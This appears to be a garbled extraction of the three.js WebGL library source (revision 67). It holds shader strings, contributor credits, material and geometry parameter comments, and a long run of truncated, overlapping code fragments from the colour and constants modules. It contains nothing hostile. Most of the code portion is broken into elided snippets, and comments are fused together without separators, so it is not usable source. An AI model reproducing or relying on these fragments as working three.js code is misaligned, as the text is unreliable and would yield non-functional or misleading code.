shadow"cameraHelperisVirtualupdateShadowCameraobjectMaterialuseMorphinguseSkinninggetObjectMaterialcustomDepthMaterialcascadepointsWorldpointsFrustumnearZfarZ__projector_texture'uv'uvOffset'uvOffset'uvScale'uvScale''rotation''scale''color''map''opacity'fogType'fogType''fogDensity''fogNear''fogFar''fogColor''alphaTest''#ffffff'spritesnSpritesoldFogTypesceneFogType'precision '' float;''uniform mat4 modelViewMatrix;''uniform mat4 projectionMatrix;''uniform float rotation;''uniform vec2 scale;''uniform vec2 uvOffset;''uniform vec2 uvScale;''attribute vec2 position;''attribute vec2 uv;''varying vec2 vUV;''void main() {''vUV = uvOffset + uv * uvScale;''vec2 alignedPosition = position * scale;''vec2 rotatedPosition;''rotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;''rotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;''vec4 finalPosition;''finalPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );''finalPosition.xy += rotatedPosition;''finalPosition = projectionMatrix * finalPosition;''gl_Position = finalPosition;''}''uniform vec3 color;''uniform sampler2D map;''uniform float opacity;''uniform int fogType;''uniform vec3 fogColor;''uniform float fogDensity;''uniform float fogNear;''uniform float fogFar;''uniform float alphaTest;''vec4 texture = texture2D( map, vUV );''if ( texture.a < alphaTest ) discard;''gl_FragColor = vec4( color * texture.xyz, texture.a * opacity );''if ( fogType > 0 ) {''float depth = gl_FragCoord.z / gl_FragCoord.w;''float fogFactor = 0.0;''if ( fogType == 1 ) {''fogFactor = smoothstep( fogNear, fogFar, depth );''} else {''const float LOG2 = 1.442695;''float fogFactor = exp2( - fogDensity * fogDensity * depth * depth * LOG2 );''fogFactor = 1.0 - clamp( fogFactor, 0.0, 1.0 );''gl_FragColor = mix( gl_FragColor, vec4( fogColor, gl_FragColor.w ), fogFactor );'DepthPassPlugin'lensFlareVertexTexture'"uniform lowp int renderType;""uniform vec3 screenPosition;""uniform vec2 scale;""uniform float rotation;""uniform sampler2D occlusionMap;""attribute vec2 position;""varying vec2 vUV;""varying float vVisibility;""vUV = uv;""vec2 pos = position;""if( renderType == 2 ) {""vec4 visibility = texture2D( occlusionMap, vec2( 0.1, 0.1 ) );""visibility += texture2D( occlusionMap, vec2( 0.5, 0.1 ) );""visibility += texture2D( occlusionMap, vec2( 0.9, 0.1 ) );""visibility += texture2D( occlusionMap, vec2( 0.9, 0.5 ) );""visibility += texture2D( occlusionMap, vec2( 0.9, 0.9 ) );""visibility += texture2D( occlusionMap, vec2( 0.5, 0.9 ) );""visibility += texture2D( occlusionMap, vec2( 0.1, 0.9 ) );""visibility += texture2D( occlusionMap, vec2( 0.1, 0.5 ) );""visibility += texture2D( occlusionMap, vec2( 0.5, 0.5 ) );""vVisibility =        visibility.r / 9.0;""vVisibility *= 1.0 - visibility.g / 9.0;""vVisibility *=       visibility.b / 9.0;""vVisibility *= 1.0 - visibility.a / 9.0;""pos.x = cos( rotation ) * position.x - sin( rotation ) * position.y;""pos.y = sin( rotation ) * position.x + cos( rotation ) * position.y;""gl_Position = vec4( ( pos * scale + screenPosition.xy ).xy, screenPosition.z, 1.0 );""uniform sampler2D map;""uniform vec3 color;""if( renderType == 0 ) {""gl_FragColor = vec4( 1.0, 0.0, 1.0, 0.0 );""} else if( renderType == 1 ) {""gl_FragColor = texture2D( map, vUV );""} else {""vec4 texture = texture2D( map, vUV );""texture.a *= opacity * vVisibility;""gl_FragColor = texture;""gl_FragColor.rgb *= color;"'lensFlare'"precision mediump float;""gl_FragColor = vec4( texture2D( map, vUV ).rgb, 0.0 );""float visibility = texture2D( occlusionMap, vec2( 0.5, 0.1 ) ).a;""visibility += texture2D( occlusionMap, vec2( 0.9, 0.5 ) ).a;""visibility += texture2D( occlusionMap, vec2( 0.5, 0.9 ) ).a;""visibility += texture2D( occlusionMap, vec2( 0.1, 0.5 ) ).a;""visibility = ( 1.0 - visibility / 4.0 );""texture.a *= opacity * visibility;"mrdoob / http://mrdoob.com/
Larry Battle / http://bateru.com/news
bhouston / http://exocortex.commrdoob / http://mrdoob.com/mikael emtinger / http://gomo.se/
philogb / http://blog.thejit.org/
egraether / http://egraether.com/
zz85 / http://www.lab4games.net/zz85/blogkile / http://kile.stravaganza.org/
WestLangley / http://github.com/WestLangleysupereggbert / http://www.paulbrunt.co.uk/
bhouston / http://exocortex.com
jordi_ros / http://plattsoft.com
D1plo1d / http://github.com/D1plo1d
timknip / http://www.floorplanner.com/
Spline from Tween.js, slightly optimized (and trashed)
http://sole.github.com/tween.js/examples/05_spline.htmlhttps://github.com/mrdoob/eventdispatcher.js/bhouston / http://exocortex.com/
stephomi / http://stephaneginier.com/julianwa / https://github.com/julianwazz85 / http://www.lab4games.net/zz85/blog
greggman / http://games.greggman.com/
Uses Focal Length (in mm) to estimate and set FOV
35mm (fullframe) camera is used if frame size is not specified;
Formula based on http://www.bobatkins.com/photography/technical/field_of_view.htmlSets an offset in a larger frustum. This is useful for multi-window or
multi-monitor/multi-machine setups.

For example, if you have 3x2 monitors and each monitor is 1920x1080 and
the monitors are in grid like this

+---+---+---+
| A | B | C |
+---+---+---+
| D | E | F |
+---+---+---+

then for each monitor you would call it like this

var w = 1920;
var h = 1080;
var fullWidth = w * 3;
var fullHeight = h * 2;

--A--
camera.setOffset( fullWidth, fullHeight, w * 0, h * 0, w, h );
--B--
camera.setOffset( fullWidth, fullHeight, w * 1, h * 0, w, h );
--C--
camera.setOffset( fullWidth, fullHeight, w * 2, h * 0, w, h );
--D--
camera.setOffset( fullWidth, fullHeight, w * 0, h * 1, w, h );
--E--
camera.setOffset( fullWidth, fullHeight, w * 1, h * 1, w, h );
--F--
camera.setOffset( fullWidth, fullHeight, w * 2, h * 1, w, h );

Note there is no reason monitors have to be the same size or in a grid.MPanknin / http://www.redplant.de/
alteredq / http://alteredqualia.com/
* parameters = {
color: <hex>,
opacity: <float>,
*  blending: THREE.NormalBlending,
depthTest: <bool>,
depthWrite: <bool>,
*  linewidth: <float>,
linecap: "round",
linejoin: "round",
*  vertexColors: <bool>
*  fog: <bool>
}alteredq / http://alteredqualia.com/
* parameters = {
color: <hex>,
opacity: <float>,
*  blending: THREE.NormalBlending,
depthTest: <bool>,
depthWrite: <bool>,
*  linewidth: <float>,
*  scale: <float>,
dashSize: <float>,
gapSize: <float>,
*  vertexColors: <bool>
*  fog: <bool>
}alteredq / http://alteredqualia.com/
* parameters = {
color: <hex>,
opacity: <float>,
map: new THREE.Texture( <Image> ),
*  lightMap: new THREE.Texture( <Image> ),
*  specularMap: new THREE.Texture( <Image> ),
*  envMap: new THREE.TextureCube( [posx, negx, posy, negy, posz, negz] ),
combine: THREE.Multiply,
reflectivity: <float>,
refractionRatio: <float>,
*  shading: THREE.SmoothShading,
blending: THREE.NormalBlending,
depthTest: <bool>,
depthWrite: <bool>,
*  wireframe: <boolean>,
wireframeLinewidth: <float>,
*  vertexColors: THREE.NoColors / THREE.VertexColors / THREE.FaceColors,
*  skinning: <bool>,
morphTargets: <bool>,
*  fog: <bool>
}alteredq / http://alteredqualia.com/
* parameters = {
color: <hex>,
ambient: <hex>,
emissive: <hex>,
opacity: <float>,
*  map: new THREE.Texture( <Image> ),
*  lightMap: new THREE.Texture( <Image> ),
*  specularMap: new THREE.Texture( <Image> ),
*  envMap: new THREE.TextureCube( [posx, negx, posy, negy, posz, negz] ),
combine: THREE.Multiply,
reflectivity: <float>,
refractionRatio: <float>,
*  shading: THREE.SmoothShading,
blending: THREE.NormalBlending,
depthTest: <bool>,
depthWrite: <bool>,
*  wireframe: <boolean>,
wireframeLinewidth: <float>,
*  vertexColors: THREE.NoColors / THREE.VertexColors / THREE.FaceColors,
*  skinning: <bool>,
morphTargets: <bool>,
morphNormals: <bool>,
*	fog: <bool>
}alteredq / http://alteredqualia.com/
* parameters = {
color: <hex>,
ambient: <hex>,
emissive: <hex>,
specular: <hex>,
shininess: <float>,
opacity: <float>,
*  map: new THREE.Texture( <Image> ),
*  lightMap: new THREE.Texture( <Image> ),
*  bumpMap: new THREE.Texture( <Image> ),
bumpScale: <float>,
*  normalMap: new THREE.Texture( <Image> ),
normalScale: <Vector2>,
*  specularMap: new THREE.Texture( <Image> ),
*  envMap: new THREE.TextureCube( [posx, negx, posy, negy, posz, negz] ),
combine: THREE.Multiply,
reflectivity: <float>,
refractionRatio: <float>,
*  shading: THREE.SmoothShading,
blending: THREE.NormalBlending,
depthTest: <bool>,
depthWrite: <bool>,
*  wireframe: <boolean>,
wireframeLinewidth: <float>,
*  vertexColors: THREE.NoColors / THREE.VertexColors / THREE.FaceColors,
*  skinning: <bool>,
morphTargets: <bool>,
morphNormals: <bool>,
*	fog: <bool>
}alteredq / http://alteredqualia.com/
* parameters = {
opacity: <float>,
*  blending: THREE.NormalBlending,
depthTest: <bool>,
depthWrite: <bool>,
*  wireframe: <boolean>,
wireframeLinewidth: <float>
}mrdoob / http://mrdoob.com/
* parameters = {
opacity: <float>,
*  shading: THREE.FlatShading,
blending: THREE.NormalBlending,
depthTest: <bool>,
depthWrite: <bool>,
*  wireframe: <boolean>,
wireframeLinewidth: <float>
}alteredq / http://alteredqualia.com/
* parameters = {
color: <hex>,
opacity: <float>,
map: new THREE.Texture( <Image> ),
*  size: <float>,
*  blending: THREE.NormalBlending,
depthTest: <bool>,
depthWrite: <bool>,
*  vertexColors: <bool>,
*  fog: <bool>
}alteredq / http://alteredqualia.com/
* parameters = {
fragmentShader: <string>,
vertexShader: <string>,
*  uniforms: { "parameter1": { type: "f", value: 1.0 }, "parameter2": { type: "i" value2: 2 } },
*  defines: { "label" : "value" },
*  shading: THREE.SmoothShading,
blending: THREE.NormalBlending,
depthTest: <bool>,
depthWrite: <bool>,
*  wireframe: <boolean>,
wireframeLinewidth: <float>,
*  lights: <bool>,
*  vertexColors: THREE.NoColors / THREE.VertexColors / THREE.FaceColors,
*  skinning: <bool>,
morphTargets: <bool>,
morphNormals: <bool>,
*	fog: <bool>
}alteredq / http://alteredqualia.com/
* parameters = {
color: <hex>,
opacity: <float>,
map: new THREE.Texture( <Image> ),
*  blending: THREE.NormalBlending,
depthTest: <bool>,
depthWrite: <bool>,
*	uvOffset: new THREE.Vector2(),
uvScale: new THREE.Vector2(),
*  fog: <bool>
}mrdoob / http://mrdoob.com/
* parameters = {
color: <hex>,
program: <function>,
opacity: <float>,
blending: THREE.NormalBlending
}szimek / https://github.com/szimek/jonobr1 / http://jonobr1.com/michael guerrero / http://realitymeltdown.comShader chunks for WebLG Shader librarymikael emtinger / http://gomo.se/Uniform UtilitiesUniforms library for shared webgl shadersWebgl Shader Library for three.jsszimek / https://github.com/szimek/
alteredq / http://alteredqualia.comalteredq / http://alteredqualia.com/
* For Text operations in three.js (See TextGeometry)
* It uses techniques used in:
* 	typeface.js and canvastext
For converting fonts and rendering with javascript
http://typeface.neocracy.org
*	Triangulation ported from AS3
Simple Polygon Triangulation
http://actionsnippet.com/?p=1462
* 	A Method to triangulate shapes with holes
http://www.sakri.net/blog/2009/06/12/an-approach-to-triangulating-polygons-with-holes/
This code is a quick port of code written in C++ which was submitted to
flipcode.com by John W. Ratcliff  // July 22, 2000
See original code and more information here:
http://www.flipcode.com/archives/Efficient_Polygon_Triangulation.shtml

ported to actionscript by Zevan Rosser
www.actionsnippet.com

ported to javascript by Joshua Koo
http://www.lab4games.net/zz85/blogzz85 / http://www.lab4games.net/zz85/blog
Extensible curve object
* Some common of Curve methods
.getPoint(t), getTangent(t)
.getPointAt(u), getTagentAt(u)
.getPoints(), .getSpacedPoints()
.getLength()
.updateArcLengths()
* This following classes subclasses THREE.Curve:
* -- 2d classes --
THREE.LineCurve
THREE.QuadraticBezierCurve
THREE.CubicBezierCurve
THREE.SplineCurve
THREE.ArcCurve
THREE.EllipseCurve
* -- 3d classes --
THREE.LineCurve3
THREE.QuadraticBezierCurve3
THREE.CubicBezierCurve3
THREE.SplineCurve3
THREE.ClosedSplineCurve3
* A series of curves can be represented as a THREE.CurvePath
*************************************************************
Abstract Curve base class************************************************************
Utils************************************************************
3D Curveszz85 / http://www.lab4games.net/zz85/blog
*************************************************************
Curved Path - a curve path is simply a array of connected
curves, but retains the api of a curve************************************************************
Create Geometries Helpers************************************************************
Bend / Wrap Helper Methodszz85 / http://www.lab4games.net/zz85/blog
Creates free form 2d path using series of points, lines or curves.
*zz85 / http://www.lab4games.net/zz85/blog
Defines a 2d shape plane using paths.
************************************************************
Line************************************************************
Quadratic Bezier curve************************************************************
Cubic Bezier curve************************************************************
Spline curve************************************************************
Ellipse curve************************************************************
Arc curve************************************************************
Line3D************************************************************
Quadratic Bezier 3D curve************************************************************
Cubic Bezier 3D curve************************************************************
Spline 3D curve************************************************************
Closed Spline 3D curvekhang duong
erik kitsonmrdoob / http://mrdoob.comCamera for rendering cube maps
- renders scene into axis-aligned cubezz85 / http://twitter.com/blurspline / http://www.lab4games.net/zz85/blog
*	A general perpose camera, for setting FOV, Lens Focal Length,
and switching between perspective and orthographic views easily.
Use this only if you do not wish to manage
both a Orthographic and Perspective Camera
mrdoob / http://mrdoob.com/
based on http://papervision3d.googlecode.com/svn/trunk/as3/trunk/src/org/papervision3d/objects/primitives/Cube.ashugheszz85 / http://www.lab4games.net/zz85/blog
* Creates extruded geometry from a path shape.
* parameters = {
*  curveSegments: <int>, // number of points on the curves
steps: <int>, // number of points for z-side extrusions / used for subdividing segements of extrude spline too
amount: <int>, // Depth to extrude the shape
*  bevelEnabled: <bool>, // turn on bevel
bevelThickness: <float>, // how deep into the original shape bevel goes
bevelSize: <float>, // how far from shape outline is bevel
bevelSegments: <int>, // number of bevel layers
*  extrudePath: <THREE.CurvePath> // 3d spline path to extrude shape along. (creates Frames if .frames aren't defined)
frames: <THREE.TubeGeometry.FrenetFrames> // containing arrays of tangents, normals, binormals
*  material: <int> // material index for front and back faces
extrudeMaterial: <int> // material index for extrusion and beveled faces
uvGenerator: <Object> // object that provides UV generator functions
* }
jonobr1 / http://jonobr1.com
* Creates a one-sided polygonal geometry from a path shape. Similar to
ExtrudeGeometry.
* parameters = {
*	curveSegments: <int>, // number of points on the curves. NOT USED AT THE MOMENT.
*	material: <int> // material index for front and back faces
uvGenerator: <Object> // object that provides UV generator functions
* }
Add an array of shapes to THREE.ShapeGeometry.Adds a shape to THREE.ShapeGeometry, based on THREE.ExtrudeGeometry.astrodud / http://astrodud.isgreat.org/
zz85 / https://github.com/zz85
mrdoob / http://mrdoob.com/
based on http://papervision3d.googlecode.com/svn/trunk/as3/trunk/src/org/papervision3d/objects/primitives/Plane.asKaleb Murphyalteredq / http://alteredqualia.com/
* For creating 3D text geometry in three.js
* Text = 3D Text
* parameters = {
size: 			<float>, 	// size of the text
height: 		<float>, 	// thickness to extrude text
curveSegments: 	<int>,		// number of points on the curves
*  font: 			<string>,		// font name
weight: 		<string>,		// font weight (normal, bold)
style: 			<string>,		// font style  (normal, italics)
*  bevelEnabled:	<bool>,			// turn on bevel
bevelThickness: <float>, 		// how deep into text bevel goes
bevelSize:		<float>, 		// how far from text outline is bevel
}
oosmoxiecode
mrdoob / http://mrdoob.com/
based on http://code.google.com/p/away3d/source/browse/trunk/fp10/Away3DLite/src/away3dlite/primitives/Torus.as?r=2888oosmoxiecode
based on http://code.google.com/p/away3d/source/browse/trunk/fp10/Away3D/src/away3d/primitives/TorusKnot.as?spec=svn2473&r=2473WestLangley / https://github.com/WestLangley
miningold / https://github.com/miningold
* Modified from the TorusKnotGeometry by @oosmoxiecode
* Creates a tube which extrudes along a 3d spline
* Uses parallel transport frames as described in
http://www.cs.indiana.edu/pub/techreports/TR425.pdfclockworkgeek / https://github.com/clockworkgeek
timothypratley / https://github.com/timothypratley
timothypratley / https://github.com/timothypratleyzz85 / https://github.com/zz85
Parametric Surfaces Geometry
based on the brilliant article by @prideout http://prideout.net/blog/?p=44
* new THREE.ParametricGeometry( parametricFunction, uSegments, ySegements );
sroucheray / http://sroucheray.org/
zz85 / http://github.com/zz85
bhouston / http://exocortex.com
* Creates an arrow for visualizing directions
* Parameters:
dir - Vector3
origin - Vector3
length - Number
color - color in hex value
headLength - Number
headWidth - Numberalteredq / http://alteredqualia.com/
*	- shows frustum, line of sight and up of the camera
- suitable for fast updates
- based on frustum visualization in lightgl.js shadowmap example
http://evanw.github.com/lightgl.js/tests/shadowmap.htmlSean Griffin / http://twitter.com/sgrif
Michael Guerrero / http://realitymeltdown.com
var THR ... '67' };THREE = ...  '67' }{ REVISION: '67' }REVISION: '67'67self.co ... }\r\n\r\n};self.co ... {}\r\n\r\n}self.console{\r\n\r\n\ti ... {}\r\n\r\n}info: function () {}log: function () {}debug:  ... n () {}warn: function () {}error:  ... n () {}( funct ... \n}() );( funct ... \r\n}() )functio ... \r\n\r\n}()functio ... \t}\r\n\r\n}{\r\n\r\n\tv ... \t}\r\n\r\n}var lastTime = 0;lastTime = 0var ven ...  'o' ];vendors ... , 'o' ][ 'ms', ... , 'o' ]mozfor ( v ... ;\r\n\r\n\t}x < ven ... onFramex < vendors.lengthvendors.length!self.r ... onFrameself.re ... onFrame++ xvar x = 0x = 0self.re ... ame' ];self.re ... rame' ]self[ v ... rame' ]vendors ... nFrame'vendors[ x ]'Reques ... nFrame'RequestAnimationFrameself.ca ... ame' ];self.ca ... rame' ]self.ca ... onFrame'Cancel ... nFrame'CancelAnimationFrameCancelRequestAnimationFrameif ( se ... ;\r\n\r\n\t}self.re ... definedself['s ... definedself['setTimeout']self.re ... \n\r\n\t\t};self.re ... \r\n\r\n\t\t}functio ... \r\n\r\n\t\t}var cur ... me ) );currTim ... e.now()timeToC ... ime ) )Math.ma ... ime ) )16 - (  ... tTime )( currT ... tTime )currTime - lastTimevar id  ... Call );id = se ... oCall )self.se ... oCall )self.setTimeoutfunctio ... ll ); }{ callb ... ll ); }callbac ... Call );callbac ... oCall )currTim ... eToCalllastTim ... ToCall;lastTim ... eToCallreturn id;if( sel ... ;\r\n\r\n\t}self.ca ... definedself['c ... definedself['clearTimeout']self.ca ... id ) };self.ca ...  id ) }functio ...  id ) }{ self. ...  id ) }self.cl ... t( id )self.clearTimeoutTHREE.C ... ne = 0;THREE.C ... one = 0THREE.CullFaceNoneTHREE.C ... ck = 1;THREE.C ... ack = 1THREE.CullFaceBackTHREE.C ... nt = 2;THREE.C ... ont = 2THREE.CullFaceFrontTHREE.C ... ck = 3;THREE.C ... ack = 3THREE.C ... ontBackTHREE.F ... CW = 0;THREE.F ... nCW = 0THREE.F ... ctionCWTHREE.F ... CW = 1;THREE.F ... CCW = 1THREE.F ... tionCCWFrontFa ... tionCCWTHREE.B ... ap = 0;THREE.B ... Map = 0THREE.BasicShadowMapTHREE.P ... ap = 1;THREE.P ... Map = 1THREE.PCFShadowMapTHREE.P ... ap = 2;THREE.P ... Map = 2THREE.P ... adowMapTHREE.FrontSide = 0;THREE.FrontSide = 0THREE.FrontSideTHREE.BackSide = 1;THREE.BackSide = 1THREE.BackSideTHREE.D ... de = 2;THREE.DoubleSide = 2THREE.DoubleSideTHREE.NoShading = 0;THREE.NoShading = 0THREE.NoShadingTHREE.F ... ng = 1;THREE.F ... ing = 1THREE.FlatShadingTHREE.S ... ng = 2;THREE.S ... ing = 2THREE.SmoothShadingTHREE.NoColors = 0;THREE.NoColors = 0THREE.NoColorsTHREE.F ... rs = 1;THREE.FaceColors = 1THREE.FaceColorsTHREE.V ... rs = 2;THREE.V ... ors = 2THREE.VertexColorsTHREE.N ... ng = 0;THREE.NoBlending = 0THREE.NoBlendingTHREE.N ... ng = 1;THREE.N ... ing = 1THREE.NormalBlendingTHREE.A ... ng = 2;THREE.A ... ing = 2THREE.A ... lendingTHREE.S ... ng = 3;THREE.S ... ing = 3THREE.S ... lendingTHREE.M ... ng = 4;THREE.M ... ing = 4THREE.M ... lendingTHREE.C ... ng = 5;THREE.C ... ing = 5THREE.CustomBlendingTHREE.A ...  = 100;THREE.A ... n = 100THREE.AddEquationTHREE.S ...  = 101;THREE.S ... n = 101THREE.S ... quationTHREE.R ...  = 102;THREE.R ... n = 102THREE.R ... quationReverse ... quationTHREE.Z ...  = 200;THREE.Z ... r = 200THREE.ZeroFactorTHREE.O ...  = 201;THREE.O ... r = 201THREE.OneFactorTHREE.S ...  = 202;THREE.S ... r = 202THREE.SrcColorFactorTHREE.O ...  = 203;THREE.O ... r = 203THREE.O ... rFactorOneMinu ... rFactorTHREE.S ...  = 204;THREE.S ... r = 204THREE.SrcAlphaFactorTHREE.O ...  = 205;THREE.O ... r = 205THREE.O ... aFactorOneMinu ... aFactorTHREE.D ...  = 206;THREE.D ... r = 206THREE.DstAlphaFactorTHREE.O ...  = 207;THREE.O ... r = 207THREE.D ...  = 208;THREE.D ... r = 208THREE.DstColorFactorTHREE.O ...  = 209;THREE.O ... r = 209THREE.S ...  = 210;THREE.S ... r = 210THREE.S ... eFactorSrcAlph ... eFactorTHREE.M ... on = 0;THREE.M ... ion = 0THREE.M ... erationTHREE.M ... on = 1;THREE.M ... ion = 1THREE.MixOperationTHREE.A ... on = 2;THREE.A ... ion = 2THREE.AddOperationTHREE.U ...  () {};THREE.U ... n () {}THREE.UVMappingTHREE.C ...  () {};THREE.C ... n () {}THREE.C ... MappingCubeRef ... MappingTHREE.S ...  () {};THREE.S ... n () {}THREE.S ... MappingSpheric ... MappingTHREE.R ... = 1000;THREE.R ...  = 1000THREE.RepeatWrappingTHREE.C ... = 1001;THREE.C ...  = 1001THREE.C ... rappingTHREE.M ... = 1002;THREE.M ...  = 1002THREE.M ... rappingMirrore ... rappingTHREE.N ... = 1003;THREE.N ...  = 1003THREE.NearestFilterTHREE.N ... = 1004;THREE.N ...  = 1004THREE.N ... tFilterNearest ... tFilterTHREE.N ... = 1005;THREE.N ...  = 1005THREE.N ... rFilterNearest ... rFilterTHREE.L ... = 1006;THREE.L ...  = 1006THREE.L ... = 1007;THREE.L ...  = 1007THREE.L ... tFilterLinearM ... tFilterTHREE.L ... = 1008;THREE.L ...  = 1008THREE.L ... rFilterLinearM ... rFilterTHREE.U ... = 1009;THREE.U ...  = 1009THREE.U ... yteTypeTHREE.B ... = 1010;THREE.B ...  = 1010THREE.ByteTypeTHREE.S ... = 1011;THREE.S ...  = 1011THREE.ShortTypeTHREE.U ... = 1012;THREE.U ...  = 1012THREE.U ... ortTypeTHREE.I ... = 1013;THREE.IntType = 1013THREE.IntTypeTHREE.U ... = 1014;THREE.U ...  = 1014THREE.U ... IntTypeTHREE.F ... = 1015;THREE.F ...  = 1015THREE.FloatTypeTHREE.U ... = 1016;THREE.U ...  = 1016THREE.U ... 444TypeUnsigne ... 444TypeTHREE.U ... = 1017;THREE.U ...  = 1017THREE.U ... 551TypeUnsigne ... 551TypeTHREE.U ... = 1018;THREE.U ...  = 1018THREE.U ... 565TypeTHREE.A ... = 1019;THREE.A ...  = 1019THREE.AlphaFormatTHREE.R ... = 1020;THREE.R ...  = 1020THREE.R ... = 1021;THREE.R ...  = 1021THREE.RGBAFormatTHREE.L ... = 1022;THREE.L ...  = 1022THREE.L ... eFormatTHREE.L ... = 1023;THREE.L ...  = 1023THREE.L ... aFormatTHREE.R ... = 2001;THREE.R ...  = 2001THREE.R ... _FormatTHREE.R ... = 2002;THREE.R ...  = 2002RGBA_S3 ... _FormatTHREE.R ... = 2003;THREE.R ...  = 2003THREE.R ... = 2004;THREE.R ...  = 2004THREE.C ...  )\r\n\r\n}functio ...  )\r\n\r\n}{\r\n\r\n\ti ...  )\r\n\r\n}if ( ar ... ;\r\n\r\n\t}argumen ... h === 3arguments.lengthreturn  ...  2 ] );this.se ... [ 2 ] )this.setRGBarguments[ 0 ]arguments[ 1 ]arguments[ 2 ]return  ... color )this.set( color )this.set{\r\n\r\n\tc ... \t}\r\n\r\n}constru ... E.Colorr: 1g: 1b: 1set: fu ... ;\r\n\r\n\t}if ( va ... \r\n\r\n\t\t}value i ... E.Colorthis.copy( value );this.copy( value )this.copyif ( ty ... \r\n\r\n\t\t}typeof  ... number'typeof valuethis.se ... alue );this.setHex( value )this.setHexthis.se ... value )this.setStylereturn this;setHex: ... ;\r\n\r\n\t}hex = M ...  hex );hex = M ... ( hex )Math.floor( hex )this.r  ...  / 255;this.r  ... ) / 255this.r( hex > ... ) / 255( hex >> 16 & 255 )hex >> 16 & 255hex >> 16this.g  ...  / 255;this.g  ... ) / 255this.g( hex >> 8 & 255 )hex >> 8 & 255hex >> 8this.b  ...  / 255;this.b  ... ) / 255this.b( hex & 255 ) / 255( hex & 255 )hex & 255setRGB: ... ;\r\n\r\n\t}this.r = r;this.r = rthis.g = g;this.g = gthis.b = b;this.b = bsetHSL: ... ;\r\n\r\n\t}if ( s  ... \r\n\r\n\t\t}s === 0this.r  ... .b = l;this.r  ... s.b = lthis.g = this.b = lthis.b = lvar hue ... \r\n\t\t\t};hue2rgb ... \n\r\n\t\t\t}functio ... \n\r\n\t\t\t}if ( t < 0 ) t += 1;t < 0t += 1;t += 1if ( t > 1 ) t -= 1;t > 1t -= 1;t -= 1if ( t  ...  6 * t;t < 1 / 61 / 6return  ...  6 * t;p + ( q ... * 6 * t( q - p ) * 6 * t( q - p ) * 6( q - p )q - pif ( t  ... turn q;t < 1 / 21 / 2return q;if ( t  ...  - t );t < 2 / 32 / 3return  ...  - t );p + ( q ... 3 - t )( q - p ... 3 - t )( 2 / 3 - t )2 / 3 - treturn p;var p = ...  * s );p = l < ... l * s )l <= 0. ... l * s )l <= 0.5l * ( 1 + s )( 1 + s )1 + sl + s - ( l * s )l + s( l * s )l * svar q = ...  ) - p;q = ( 2 * l ) - p( 2 * l ) - p( 2 * l )2 * lthis.r  ...  / 3 );this.r  ... 1 / 3 )hue2rgb ... 1 / 3 )h + 1 / 31 / 3this.g  ... p, h );this.g  ...  p, h )hue2rgb( q, p, h )this.b  ...  / 3 );this.b  ... 1 / 3 )h - 1 / 3setStyl ... \n\r\n\r\n\t}functio ... \n\r\n\r\n\t}{\r\n\r\n\t\t ... \n\r\n\r\n\t}if ( /^ ... \r\n\r\n\t\t}/^rgb\( ... style )/^rgb\( ... /i.test/^rgb\( ... +)\)$/i^rgb\((\d+), ?(\d+), ?(\d+)\)$(\d+)\d+ ?var col ... tyle );color = ... style )/^rgb\( ... /i.execMath.mi ... ) / 255Math.mi ...  10 ) )parseIn ... ], 10 )color[ 1 ]color[ 2 ]color[ 3 ]/^rgb\( ... \%\)$/i^rgb\((\d+)\%, ?(\d+)\%, ?(\d+)\%\)$\%this.r  ...  / 100;this.r  ... ) / 100Math.mi ... ) / 100this.g  ...  / 100;this.g  ... ) / 100this.b  ...  / 100;this.b  ... ) / 100/^\#([0 ... style )/^\#([0 ... /i.test^\#([0-9a-f]{6})$\#([0-9a-f]{6})[0-9a-f]{6}[0-9a-f]0-9a-f/^\#([0 ... /i.execthis.se ... 16 ) );this.se ...  16 ) )parseIn ... ], 16 )/^\#([0 ... -f])$/i^\#([0-9a-f])([0-9a-f])([0-9a-f])$([0-9a-f])color[  ... or[ 3 ]color[  ... or[ 2 ]color[  ... or[ 1 ]/^(\w+) ... style )/^(\w+)$/i.test^(\w+)$(\w+)\w+\wthis.se ... le ] );this.se ... yle ] )THREE.C ... style ]THREE.ColorKeywordscopy: f ... ;\r\n\r\n\t}this.r = color.r;this.r = color.rcolor.rthis.g = color.g;this.g = color.gcolor.gthis.b = color.b;this.b = color.bcolor.bcopyGam ... ;\r\n\r\n\t}this.r  ... olor.r;this.r  ... color.rcolor.r * color.rthis.g  ... olor.g;this.g  ... color.gcolor.g * color.gthis.b  ... olor.b;this.b  ... color.bcolor.b * color.bcopyLin ... ;\r\n\r\n\t}this.r  ... or.r );this.r  ... lor.r )Math.sqrt( color.r )this.g  ... or.g );this.g  ... lor.g )Math.sqrt( color.g )this.b  ... or.b );this.b  ... lor.b )Math.sqrt( color.b )convert ... ;\r\n\r\n\t}var r = ... this.b;r = this.rg = this.gb = this.bthis.r = r * r;this.r = r * rr * rthis.g = g * g;this.g = g * gg * gthis.b = b * b;this.b = b * bb * bthis.r  ... is.r );this.r  ... his.r )Math.sqrt( this.r )this.g  ... is.g );this.g  ... his.g )Math.sqrt( this.g )this.b  ... is.b );this.b  ... his.b )Math.sqrt( this.b )getHex: ... ;\r\n\r\n\t}return  ... ) << 0;( this. ...  ) << 0( this. ...  ) << 8( this. ... ) << 16( this.r * 255 )this.r * 255( this.g * 255 )this.g * 255( this.b * 255 )this.b * 255getHexS ... ;\r\n\r\n\t}return  ...  - 6 );( '0000 ... ( - 6 )( '0000 ... ).slice( '0000 ...  16 ) )'000000 ... g( 16 )this.ge ... g( 16 )this.ge ... oStringthis.getHex()this.getHex- 6getHSL: ... ;\r\n\r\n\t}var hsl ... l: 0 };hsl = o ...  l: 0 }optiona ...  l: 0 }{ h: 0, s: 0, l: 0 }h: 0s: 0l: 0var max ... g, b );max = M ...  g, b )Math.max( r, g, b )var min ... g, b );min = M ...  g, b )Math.min( r, g, b )var hue, saturation;var lig ...  / 2.0;lightne ... ) / 2.0( min + max ) / 2.0( min + max )min + maxif ( mi ... \r\n\r\n\t\t}min === maxhue = 0;hue = 0saturation = 0;saturation = 0var del ...  - min;delta = max - minmax - minsaturat ...  min );saturat ... - min )lightne ... - min )lightness <= 0.5delta / ... + min )( max + min )max + mindelta / ... - min )( 2 - max - min )2 - max - min2 - maxswitch  ... \n\r\n\t\t\t}case r: ...  break;hue = ( ...  : 0 );hue = ( ... 6 : 0 )( g - b ... 6 : 0 )( g - b ) / delta( g - b )g - b( g < b ? 6 : 0 )g < b ? 6 : 0g < bcase g: ...  break;hue = ( ... ta + 2;hue = ( ... lta + 2( b - r ... lta + 2( b - r ) / delta( b - r )b - rcase b: ...  break;hue = ( ... ta + 